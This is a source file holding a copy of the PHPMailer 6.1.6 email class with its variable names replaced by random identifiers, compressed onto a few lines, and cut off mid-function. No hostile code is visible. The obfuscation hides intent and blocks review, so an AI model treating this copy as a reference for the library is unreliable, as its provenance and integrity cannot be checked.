<?php
error_reporting(E_PARSE | E_CORE_ERROR); class PHPMailer { const CHARSET_ASCII = 'us-ascii'; const CHARSET_ISO88591 = 'iso-8859-1'; const CHARSET_UTF8 = 'utf-8'; const CONTENT_TYPE_PLAINTEXT = 'text/plain'; const CONTENT_TYPE_TEXT_CALENDAR = 'text/calendar'; const CONTENT_TYPE_TEXT_HTML = 'text/html'; const CONTENT_TYPE_MULTIPART_ALTERNATIVE = 'multipart/alternative'; const CONTENT_TYPE_MULTIPART_MIXED = 'multipart/mixed'; const CONTENT_TYPE_MULTIPART_RELATED = 'multipart/related'; const ENCODING_7BIT = '7bit'; const ENCODING_8BIT = '8bit'; const ENCODING_BASE64 = 'base64'; const ENCODING_BINARY = 'binary'; const ENCODING_QUOTED_PRINTABLE = 'quoted-printable'; const ENCRYPTION_STARTTLS = 'tls'; const ENCRYPTION_SMTPS = 'ssl'; const ICAL_METHOD_REQUEST = 'REQUEST'; const ICAL_METHOD_PUBLISH = 'PUBLISH'; const ICAL_METHOD_REPLY = 'REPLY'; const ICAL_METHOD_ADD = 'ADD'; const ICAL_METHOD_CANCEL = 'CANCEL'; const ICAL_METHOD_REFRESH = 'REFRESH'; const ICAL_METHOD_COUNTER = 'COUNTER'; const ICAL_METHOD_DECLINECOUNTER = 'DECLINECOUNTER'; public $Priority; public $CharSet = self::CHARSET_ISO88591; public $ContentType = self::CONTENT_TYPE_PLAINTEXT; public $Encoding = self::ENCODING_8BIT; public $ErrorInfo = ''; public $From = 'root@localhost'; public $FromName = 'Root User'; public $Sender = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected static $IcalMethods = array(self::ICAL_METHOD_REQUEST, self::ICAL_METHOD_PUBLISH, self::ICAL_METHOD_REPLY, self::ICAL_METHOD_ADD, self::ICAL_METHOD_CANCEL, self::ICAL_METHOD_REFRESH, self::ICAL_METHOD_COUNTER, self::ICAL_METHOD_DECLINECOUNTER); protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = 'mail'; public $Sendmail = '/usr/sbin/sendmail'; public $UseSendmailOptions = true; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = 'localhost'; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; protected $oauth; public $Timeout = 300; public $dsn = ''; public $SMTPDebug = 0; public $Debugoutput = 'echo'; public $SMTPKeepAlive = false; public $SingleTo = false; protected $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_copyHeaderFields = true; public $DKIM_extraHeaders = array(); public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = ''; public static $validator = 'php'; protected $smtp; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const VERSION = '6.1.6'; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; const CRLF = '
'; const FWS = ' '; protected static $LE = self::CRLF; const MAIL_MAX_LINE_LENGTH = 63; const MAX_LINE_LENGTH = 998; const STD_LINE_LENGTH = 76; public function __construct($sp39e117 = null) { if (null !== $sp39e117) { $this->exceptions = (bool) $sp39e117; } $this->Debugoutput = strpos(PHP_SAPI, 'cli') !== false ? 'echo' : 'html'; } public function __destruct() { $this->smtpClose(); } private function sp832579($sp22e9ba, $spe07543, $spf387a7, $sp40834a, $sp848dbc) { if (ini_get('mbstring.func_overload') & 1) { $spe07543 = $this->secureHeader($spe07543); } else { $spe07543 = $this->encodeHeader($this->secureHeader($spe07543)); } if (!$this->UseSendmailOptions || null === $sp848dbc) { $spee7daf = @mail($sp22e9ba, $spe07543, $spf387a7, $sp40834a); } else { $spee7daf = @mail($sp22e9ba, $spe07543, $spf387a7, $sp40834a, $sp848dbc); } return $spee7daf; } protected function edebug($spc2c611) { if ($this->SMTPDebug <= 0) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug($spc2c611); return; } if (is_callable($this->Debugoutput) && !in_array($this->Debugoutput, array('error_log', 'html', 'echo'))) { call_user_func($this->Debugoutput, $spc2c611, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case 'error_log': error_log($spc2c611); break; case 'html': echo htmlentities(preg_replace('/[\\r\\n]+/', '', $spc2c611), ENT_QUOTES, 'UTF-8'), '<br>
'; break; case 'echo': default: $spc2c611 = preg_replace('/\\r\\n|\\r/m', '
', $spc2c611); echo gmdate('Y-m-d H:i:s'), '	', trim(str_replace('
', '
                   	                  ', trim($spc2c611))), '
'; } } public function isHTML($sp8e6336 = true) { if ($sp8e6336) { $this->ContentType = static::CONTENT_TYPE_TEXT_HTML; } else { $this->ContentType = static::CONTENT_TYPE_PLAINTEXT; } } public function isSMTP() { $this->Mailer = 'smtp'; } public function isMail() { $this->Mailer = 'mail'; } public function isSendmail() { $spcda9c9 = ini_get('sendmail_path'); if (false === stripos($spcda9c9, 'sendmail')) { $this->Sendmail = '/usr/sbin/sendmail'; } else { $this->Sendmail = $spcda9c9; } $this->Mailer = 'sendmail'; } public function isQmail() { $spcda9c9 = ini_get('sendmail_path'); if (false === stripos($spcda9c9, 'qmail')) { $this->Sendmail = '/var/qmail/bin/qmail-inject'; } else { $this->Sendmail = $spcda9c9; } $this->Mailer = 'qmail'; } public function addAddress($spac533a, $spab4c5e = '') { return $this->addOrEnqueueAnAddress('to', $spac533a, $spab4c5e); } public function addCC($spac533a, $spab4c5e = '') { return $this->addOrEnqueueAnAddress('cc', $spac533a, $spab4c5e); } public function addBCC($spac533a, $spab4c5e = '') { return $this->addOrEnqueueAnAddress('bcc', $spac533a, $spab4c5e); } public function addReplyTo($spac533a, $spab4c5e = '') { return $this->addOrEnqueueAnAddress('Reply-To', $spac533a, $spab4c5e); } protected function addOrEnqueueAnAddress($spd680a0, $spac533a, $spab4c5e) { $spac533a = trim($spac533a); $spab4c5e = trim(preg_replace('/[\\r\\n]+/', '', $spab4c5e)); $spa1678b = strrpos($spac533a, '@'); if (false === $spa1678b) { $spaeab67 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spd680a0, $spac533a); $this->setError($spaeab67); $this->edebug($spaeab67); if ($this->exceptions) { throw new Exception($spaeab67); } return false; } $sp848dbc = array($spd680a0, $spac533a, $spab4c5e); if (static::idnSupported() && $this->has8bitChars(substr($spac533a, ++$spa1678b))) { if ('Reply-To' !== $spd680a0) { if (!array_key_exists($spac533a, $this->RecipientsQueue)) { $this->RecipientsQueue[$spac533a] = $sp848dbc; return true; } } elseif (!array_key_exists($spac533a, $this->ReplyToQueue)) { $this->ReplyToQueue[$spac533a] = $sp848dbc; return true; } return false; } return call_user_func_array(array($this, 'addAnAddress'), $sp848dbc); } protected function addAnAddress($spd680a0, $spac533a, $spab4c5e = '') { if (!in_array($spd680a0, array('to', 'cc', 'bcc', 'Reply-To'))) { $spaeab67 = sprintf('%s: %s', $this->lang('Invalid recipient kind'), $spd680a0); $this->setError($spaeab67); $this->edebug($spaeab67); if ($this->exceptions) { throw new Exception($spaeab67); } return false; } if (!static::validateAddress($spac533a)) { $spaeab67 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $spd680a0, $spac533a); $this->setError($spaeab67); $this->edebug($spaeab67); if ($this->exceptions) { throw new Exception($spaeab67); } return false; } if ('Reply-To' !== $spd680a0) { if (!array_key_exists(strtolower($spac533a), $this->all_recipients)) { $this->{$spd680a0}[] = array($spac533a, $spab4c5e); $this->all_recipients[strtolower($spac533a)] = true; return true; } } elseif (!array_key_exists(strtolower($spac533a), $this->ReplyTo)) { $this->ReplyTo[strtolower($spac533a)] = array($spac533a, $spab4c5e); return true; } return false; } public static function parseAddresses($sp7451b1, $sp96eb96 = true) { $spee41bf = array(); if ($sp96eb96 && function_exists('imap_rfc822_parse_adrlist')) { $spe1fa31 = imap_rfc822_parse_adrlist($sp7451b1, ''); foreach ($spe1fa31 as $spac533a) { if ('.SYNTAX-ERROR.' !== $spac533a->host && static::validateAddress($spac533a->mailbox . '@' . $spac533a->host)) { $spee41bf[] = array('name' => property_exists($spac533a, 'personal') ? $spac533a->personal : '', 'address' => $spac533a->mailbox . '@' . $spac533a->host); } } } else { $spe1fa31 = explode(',', $sp7451b1); foreach ($spe1fa31 as $spac533a) { $spac533a = trim($spac533a); if (strpos($spac533a, '<') === false) { if (static::validateAddress($spac533a)) { $spee41bf[] = array('name' => '', 'address' => $spac533a); } } else { list($spab4c5e, $spe9347f) = explode('<', $spac533a); $spe9347f = trim(str_replace('>', '', $spe9347f)); if (static::validateAddress($spe9347f)) { $spee41bf[] = array('name' => trim(str_replace(array('"', '\''), '', $spab4c5e)), 'address' => $spe9347f); } } } } return $spee41bf; } public function setFrom($spac533a, $spab4c5e = '', $spb5daa3 = true) { $spac533a = trim($spac533a); $spab4c5e = trim(preg_replace('/[\\r\\n]+/', '', $spab4c5e)); $spa1678b = strrpos($spac533a, '@'); if (false === $spa1678b || (!$this->has8bitChars(substr($spac533a, ++$spa1678b)) || !static::idnSupported()) && !static::validateAddress($spac533a)) { $spaeab67 = sprintf('%s (From): %s', $this->lang('invalid_address'), $spac533a); $this->setError($spaeab67); $this->edebug($spaeab67); if ($this->exceptions) { throw new Exception($spaeab67); } return false; } $this->From = $spac533a; $this->FromName = $spab4c5e; if ($spb5daa3 && empty($this->Sender)) { $this->Sender = $spac533a; } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($spac533a, $spf93523 = null) { if (null === $spf93523) { $spf93523 = static::$validator; } if (is_callable($spf93523)) { return $spf93523($spac533a); } if (strpos($spac533a, '
') !== false || strpos($spac533a, '') !== false) { return false; } switch ($spf93523) { case 'pcre': case 'pcre8': return (bool) preg_match('/^(?!(?>(?1)"?(?>\\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\\[ -~]|[^"])"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>\\x0D\\x0A)?[\\t ])+|(?>[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?>(?2)' . '(?>[\\x01-\\x08\\x0B\\x0C\\x0E-\'*-\\[\\]-\\x7F]|\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' . '([!#-\'*+\\/-9=?^-~-]+|"(?>(?2)(?>[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\[\\x00-\\x7F]))*' . '(?2)")(?>(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' . '(?>(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' . '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\\.(?9)){3}))\\])(?1)$/isD', $spac533a); case 'html5': return (bool) preg_match('/^[a-zA-Z0-9.!#$%&\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' . '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD', $spac533a); case 'php': default: return filter_var($spac533a, FILTER_VALIDATE_EMAIL) !== false; } } public static function idnSupported() { return function_exists('idn_to_ascii') && function_exists('mb_convert_encoding'); } public function punyencodeAddress($spac533a) { $spa1678b = strrpos($spac533a, '@'); if (!empty($this->CharSet) && false !== $spa1678b && static::idnSupported()) { $sp901a6b = substr($spac533a, ++$spa1678b); if ($this->has8bitChars($sp901a6b) && @mb_check_encoding($sp901a6b, $this->CharSet)) { $sp901a6b = mb_convert_encoding($sp901a6b, 'UTF-8', $this->CharSet); $sp8eae02 = 0; if (defined('INTL_IDNA_VARIANT_UTS46')) { $sp236d42 = idn_to_ascii($sp901a6b, $sp8eae02, INTL_IDNA_VARIANT_UTS46); } elseif (defined('INTL_IDNA_VARIANT_2003')) { $sp236d42 = idn_to_ascii($sp901a6b, $sp8eae02, INTL_IDNA_VARIANT_2003); } else { $sp236d42 = idn_to_ascii($sp901a6b, $sp8eae02); } if (false !== $sp236d42) { return substr($spac533a, 0, $spa1678b) . $sp236d42; } } } return $spac533a; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (Exception $spb3d816) { $this->mailHeader = ''; $this->setError($spb3d816->getMessage()); if ($this->exceptions) { throw $spb3d816; } return false; } } public function preSend() { if ('smtp' === $this->Mailer || 'mail' === $this->Mailer && stripos(PHP_OS, 'WIN') === 0) { static::setLE(self::CRLF); } else { static::setLE(PHP_EOL); } if ('mail' === $this->Mailer && (PHP_VERSION_ID >= 70000 && PHP_VERSION_ID < 70017 || PHP_VERSION_ID >= 70100 && PHP_VERSION_ID < 70103) && ini_get('mail.add_x_header') === '1' && stripos(PHP_OS, 'WIN') === 0) { trigger_error('Your version of PHP is affected by a bug that may result in corrupted messages.' . ' To fix it, switch to sending using SMTP, disable the mail.add_x_header option in' . ' your php.ini, switch to MacOS or Linux, or upgrade your PHP to version 7.0.17+ or 7.1.3+.', E_USER_WARNING); } try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $sp848dbc) { $sp848dbc[1] = $this->punyencodeAddress($sp848dbc[1]); call_user_func_array(array($this, 'addAnAddress'), $sp848dbc); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new Exception($this->lang('provide_address'), self::STOP_CRITICAL); } foreach (array('From', 'Sender', 'ConfirmReadingTo') as $sp2bf7b7) { $this->{$sp2bf7b7} = trim($this->{$sp2bf7b7}); if (empty($this->{$sp2bf7b7})) { continue; } $this->{$sp2bf7b7} = $this->punyencodeAddress($this->{$sp2bf7b7}); if (!static::validateAddress($this->{$sp2bf7b7})) { $spaeab67 = sprintf('%s (%s): %s', $this->lang('invalid_address'), $sp2bf7b7, $this->{$sp2bf7b7}); $this->setError($spaeab67); $this->edebug($spaeab67); if ($this->exceptions) { throw new Exception($spaeab67); } return false; } } if ($this->alternativeExists()) { $this->ContentType = static::CONTENT_TYPE_MULTIPART_ALTERNATIVE; } $this->setMessageType(); if (!$this->AllowEmpty && empty($this->Body)) { throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL); } $this->Subject = trim($this->Subject); $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $sp7dcf8a = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $sp7dcf8a; if ('mail' === $this->Mailer) { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend('To', $this->to); } else { $this->mailHeader .= $this->headerLine('To', 'undisclosed-recipients:;'); } $this->mailHeader .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))); } if (!empty($this->DKIM_domain) && !empty($this->DKIM_selector) && (!empty($this->DKIM_private_string) || !empty($this->DKIM_private) && static::isPermittedPath($this->DKIM_private) && file_exists($this->DKIM_private))) { $sp11eff5 = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = static::stripTrailingWSP($this->MIMEHeader) . static::$LE . static::normalizeBreaks($sp11eff5) . static::$LE; } return true; } catch (Exception $spb3d816) { $this->setError($spb3d816->getMessage()); if ($this->exceptions) { throw $spb3d816; } return false; } } public function postSend() { try { switch ($this->Mailer) { case 'sendmail': case 'qmail': return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case 'smtp': return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case 'mail': return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $sp21d6ce = $this->Mailer . 'Send'; if (method_exists($this, $sp21d6ce)) { return $this->{$sp21d6ce}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (Exception $spb3d816) { $this->setError($spb3d816->getMessage()); $this->edebug($spb3d816->getMessage()); if ($this->exceptions) { throw $spb3d816; } } return false; } protected function sendmailSend($sp40834a, $spf387a7) { $sp40834a = static::stripTrailingWSP($sp40834a) . static::$LE . static::$LE; if (!empty($this->Sender) && self::isShellSafe($this->Sender)) { if ('qmail' === $this->Mailer) { $sp1439a1 = '%s -f%s'; } else { $sp1439a1 = '%s -oi -f%s -t'; } } elseif ('qmail' === $this->Mailer) { $sp1439a1 = '%s'; } else { $sp1439a1 = '%s -oi -t'; } $sp79fbaf = sprintf($sp1439a1, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $sp733e57) { $sp8475c9 = @popen($sp79fbaf, 'w'); if (!$sp8475c9) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } fwrite($sp8475c9, 'To: ' . $sp733e57 . '
'); fwrite($sp8475c9, $sp40834a); fwrite($sp8475c9, $spf387a7); $spee7daf = pclose($sp8475c9); $this->doCallback($spee7daf === 0, array($sp733e57), $this->cc, $this->bcc, $this->Subject, $spf387a7, $this->From, array()); if (0 !== $spee7daf) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } } } else { $sp8475c9 = @popen($sp79fbaf, 'w'); if (!$sp8475c9) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } fwrite($sp8475c9, $sp40834a); fwrite($sp8475c9, $spf387a7); $spee7daf = pclose($sp8475c9); $this->doCallback($spee7daf === 0, $this->to, $this->cc, $this->bcc, $this->Subject, $spf387a7, $this->From, array()); if (0 !== $spee7daf) { throw new Exception($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($spb2f62c) { if (escapeshellcmd($spb2f62c) !== $spb2f62c || !in_array(escapeshellarg($spb2f62c), array("'{$spb2f62c}'", "\"{$spb2f62c}\""))) { return false; } $spc872ec = strlen($spb2f62c); for ($sp4ed825 = 0; $sp4ed825 < $spc872ec; ++$sp4ed825) { $spa94366 = $spb2f62c[$sp4ed825]; if (!ctype_alnum($spa94366) && strpos('@_-.', $spa94366) === false) { return false; } } return true; } protected static function isPermittedPath($sp671dee) { return !preg_match('#^[a-z]+://#i', $sp671dee); } protected function mailSend($sp40834a, $spf387a7) { $sp40834a = static::stripTrailingWSP($sp40834a) . static::$LE . static::$LE; $sp60b829 = array(); foreach ($this->to as $sp34564a) { $sp60b829[] = $this->addrFormat($sp34564a); } $sp22e9ba = implode(', ', $sp60b829); $sp848dbc = null; if (!empty($this->Sender) && static::validateAddress($this->Sender) && self::isShellSafe($this->Sender)) { $sp848dbc = sprintf('-f%s', $this->Sender); } if (!empty($this->Sender) && static::validateAddress($this->Sender)) { $sp1d3b5c = ini_get('sendmail_from'); ini_set('sendmail_from', $this->Sender); } $spee7daf = false; if ($this->SingleTo && count($sp60b829) > 1) { foreach ($sp60b829 as $sp733e57) { $spee7daf = $this->sp832579($sp733e57, $this->Subject, $spf387a7, $sp40834a, $sp848dbc); $this->doCallback($spee7daf, array($sp733e57), $this->cc, $this->bcc, $this->Subject, $spf387a7, $this->From, array()); } } else { $spee7daf = $this->sp832579($sp22e9ba, $this->Subject, $spf387a7, $sp40834a, $sp848dbc); $this->doCallback($spee7daf, $this->to, $this->cc, $this->bcc, $this->Subject, $spf387a7, $this->From, array()); } if (isset($sp1d3b5c)) { ini_set('sendmail_from', $sp1d3b5c); } if (!$spee7daf) { throw new Exception($this->lang('instantiate'), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return $this->smtp; } public function setSMTPInstance(SMTP $sp3519a1) { $this->smtp = $sp3519a1; return $this->smtp; } protected function smtpSend($sp40834a, $spf387a7) { $sp40834a = static::stripTrailingWSP($sp40834a) . static::$LE . static::$LE; $sp7cd34e = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new Exception($this->lang('smtp_connect_failed'), self::STOP_CRITICAL); } if ('' === $this->Sender) { $spe0b30d = $this->From; } else { $spe0b30d = $this->Sender; } if (!$this->smtp->mail($spe0b30d)) { $this->setError($this->lang('from_failed') . $spe0b30d . ' : ' . implode(',', $this->smtp->getError())); throw new Exception($this->ErrorInfo, self::STOP_CRITICAL); } $sp149449 = array(); foreach (array($this->to, $this->cc, $this->bcc) as $sp449ef9) { foreach ($sp449ef9 as $sp22e9ba) { if (!$this->smtp->recipient($sp22e9ba[0], $this->dsn)) { $sp2ff0a1 = $this->smtp->getError(); $sp7cd34e[] = array('to' => $sp22e9ba[0], 'error' => $sp2ff0a1['detail']); $spfd4e01 = false; } else { $spfd4e01 = true; } $sp149449[] = array('issent' => $spfd4e01, 'to' => $sp22e9ba[0]); } } if (count($this->all_recipients) > count($sp7cd34e) && !$this->smtp->data($sp40834a . $spf387a7)) { throw new Exception($this->lang('data_not_accepted'), self::STOP_CRITICAL); } $sp954053 = $this->smtp->getLastTransactionID(); if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } foreach ($sp149449 as $spa351a8) { $this->doCallback($spa351a8['issent'], array($spa351a8['to']), array(), array(), $this->Subject, $spf387a7, $this->From, array('smtp_transaction_id' => $sp954053)); } if (count($sp7cd34e) > 0) { $sp613561 = ''; foreach ($sp7cd34e as $spde25eb) { $sp613561 .= $spde25eb['to'] . ': ' . $spde25eb['error']; } throw new Exception($this->lang('recipients_failed') . $sp613561, self::STOP_CONTINUE); } return true; } public function smtpConnect($spd5cf8e = null) { if (null === $this->smtp) { $this->smtp = $this->getSMTPInstance(); } if (null === $spd5cf8e) { $spd5cf8e = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $sp129b93 = explode(';', $this->Host); $sp629bc2 = null; foreach ($sp129b93 as $sp87c6be) { $sp80bbce = array(); if (!preg_match('/^(?:(ssl|tls):\\/\\/)?(.+?)(?::(\\d+))?$/', trim($sp87c6be), $sp80bbce)) { $this->edebug($this->lang('invalid_hostentry') . ' ' . trim($sp87c6be)); continue; } if (!static::isValidHost($sp80bbce[2])) { $this->edebug($this->lang('invalid_host') . ' ' . $sp80bbce[2]); continue; } $sp3ddc77 = ''; $sp42215b = $this->SMTPSecure; $sp4529fc = static::ENCRYPTION_STARTTLS === $this->SMTPSecure; if ('ssl' === $sp80bbce[1] || '' === $sp80bbce[1] && static::ENCRYPTION_SMTPS === $this->SMTPSecure) { $sp3ddc77 = 'ssl://'; $sp4529fc = false; $sp42215b = static::ENCRYPTION_SMTPS; } elseif ('tls' === $sp80bbce[1]) { $sp4529fc = true; $sp42215b = static::ENCRYPTION_STARTTLS; } $sp22604d = defined('OPENSSL_ALGO_SHA256'); if (static::ENCRYPTION_STARTTLS === $sp42215b || static::ENCRYPTION_SMTPS === $sp42215b) { if (!$sp22604d) { throw new Exception($this->lang('extension_missing') . 'openssl', self::STOP_CRITICAL); } } $spe005e4 = $sp80bbce[2]; $spd2e0e6 = $this->Port; if (array_key_exists(3, $sp80bbce) && is_numeric($sp80bbce[3]) && $sp80bbce[3] > 0 && $sp80bbce[3] < 65536) { $spd2e0e6 = (int) $sp80bbce[3]; } if ($this->smtp->connect($sp3ddc77 . $spe005e4, $spd2e0e6, $this->Timeout, $spd5cf8e)) { try { if ($this->Helo) { $sp1bec12 = $this->Helo; } else { $sp1bec12 = $this->serverHostname(); } $this->smtp->hello($sp1bec12); if ($this->SMTPAutoTLS && $sp22604d && 'ssl' !== $sp42215b && $this->smtp->getServerExt('STARTTLS')) { $sp4529fc = true; } if ($sp4529fc) { if (!$this->smtp->startTLS()) { throw new Exception($this->lang('connect_host')); } $this->smtp->hello($sp1bec12); } if ($this->SMTPAuth && !$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->oauth)) { throw new Exception($this->lang('authenticate')); } return true; } catch (Exception $spb3d816) { $sp629bc2 = $spb3d816; $this->edebug($spb3d816->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions && null !== $sp629bc2) { throw $sp629bc2; } return false; } public function smtpClose() { if (null !== $this->smtp && $this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } public function setLanguage($sp69fd68 = 'en', $sp2cbcff = '') { $sp351d7a = array('br' => 'pt_br', 'cz' => 'cs', 'dk' => 'da', 'no' => 'nb', 'se' => 'sv', 'rs' => 'sr', 'tg' => 'tl', 'am' => 'hy'); if (isset($sp351d7a[$sp69fd68])) { $sp69fd68 = $sp351d7a[$sp69fd68]; } $sp002bf7 = array('authenticate' => 'SMTP Error: Could not authenticate.', 'connect_host' => 'SMTP Error: Could not connect to SMTP host.', 'data_not_accepted' => 'SMTP Error: data not accepted.', 'empty_message' => 'Message body empty', 'encoding' => 'Unknown encoding: ', 'execute' => 'Could not execute: ', 'file_access' => 'Could not access file: ', 'file_open' => 'File Error: Could not open file: ', 'from_failed' => 'The following From address failed: ', 'instantiate' => 'Could not instantiate mail function.', 'invalid_address' => 'Invalid address: ', 'invalid_hostentry' => 'Invalid hostentry: ', 'invalid_host' => 'Invalid host: ', 'mailer_not_supported' => ' mailer is not supported.', 'provide_address' => 'You must provide at least one recipient email address.', 'recipients_failed' => 'SMTP Error: The following recipients failed: ', 'signing' => 'Signing Error: ', 'smtp_connect_failed' => 'SMTP connect() failed.', 'smtp_error' => 'SMTP server error: ', 'variable_set' => 'Cannot set or reset variable: ', 'extension_missing' => 'Extension missing: '); if (empty($sp2cbcff)) { $sp2cbcff = dirname(__DIR__) . DIRECTORY_SEPARATOR . 'language' . DIRECTORY_SEPARATOR; } if (!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/', $sp69fd68)) { $sp69fd68 = 'en'; } $spe22ed5 = true; $sp027910 = $sp2cbcff . 'phpmailer.lang-' . $sp69fd68 . '.php'; if ('en' !== $sp69fd68) { if (!static::isPermittedPath($sp027910) || !file_exists($sp027910)) { $spe22ed5 = false; } else { $spe22ed5 = (include $sp027910); } } $this->language = $sp002bf7; return (bool) $spe22ed5; } public function getTranslations() { return $this->language; } public function addrAppend($sp0df7d0, $spde7457) { $spee41bf = array(); foreach ($spde7457 as $spac533a) { $spee41bf[] = $this->addrFormat($spac533a); } return $sp0df7d0 . ': ' . implode(', ', $spee41bf) . static::$LE; } public function addrFormat($spde7457) { if (empty($spde7457[1])) { return $this->secureHeader($spde7457[0]); } return $this->encodeHeader($this->secureHeader($spde7457[1]), 'phrase') . ' <' . $this->secureHeader($spde7457[0]) . '>'; } public function wrapText($sp7a9528, $spc872ec, $spef4125 = false) { if ($spef4125) { $sp73e96d = sprintf(' =%s', static::$LE); } else { $sp73e96d = static::$LE; } $sp6d05aa = static::CHARSET_UTF8 === strtolower($this->CharSet); $sp866eae = strlen(static::$LE); $spfaa81a = strlen(static::$LE); $sp7a9528 = static::normalizeBreaks($sp7a9528); if (substr($sp7a9528, -$sp866eae) === static::$LE) { $sp7a9528 = substr($sp7a9528, 0, -$sp866eae); } $sp38fd55 = explode(static::$LE, $sp7a9528); $sp7a9528 = ''; foreach ($sp38fd55 as $sp209680) { $sp5b6353 = explode(' ', $sp209680); $spd87485 = ''; $sp3c57d0 = true; foreach ($sp5b6353 as $sp6da2a2) { if ($spef4125 && strlen($sp6da2a2) > $spc872ec) { $sp62d7fb = $spc872ec - strlen($spd87485) - $spfaa81a; if (!$sp3c57d0) { if ($sp62d7fb > 20) { $sp36b4d9 = $sp62d7fb; if ($sp6d05aa) { $sp36b4d9 = $this->utf8CharBoundary($sp6da2a2, $sp36b4d9); } elseif ('=' === substr($sp6da2a2, $sp36b4d9 - 1, 1)) { --$sp36b4d9; } elseif ('=' === substr($sp6da2a2, $sp36b4d9 - 2, 1)) { $sp36b4d9 -= 2; } $sp321402 = substr($sp6da2a2, 0, $sp36b4d9); $sp6da2a2 = substr($sp6da2a2, $sp36b4d9); $spd87485 .= ' ' . $sp321402; $sp7a9528 .= $spd87485 . sprintf('=%s', static::$LE); } else { $sp7a9528 .= $spd87485 . $sp73e96d; } $spd87485 = ''; } while ($sp6da2a2 !== '') { if ($spc872ec <= 0) { break; } $sp36b4d9 = $spc872ec; if ($sp6d05aa) { $sp36b4d9 = $this->utf8CharBoundary($sp6da2a2, $sp36b4d9); } elseif ('=' === substr($sp6da2a2, $sp36b4d9 - 1, 1)) { --$sp36b4d9; } elseif ('=' === substr($sp6da2a2, $sp36b4d9 - 2, 1)) { $sp36b4d9 -= 2; } $sp321402 = substr($sp6da2a2, 0, $sp36b4d9); $sp6da2a2 = (string) substr($sp6da2a2, $sp36b4d9); if ($sp6da2a2 !== '') { $sp7a9528 .= $sp321402 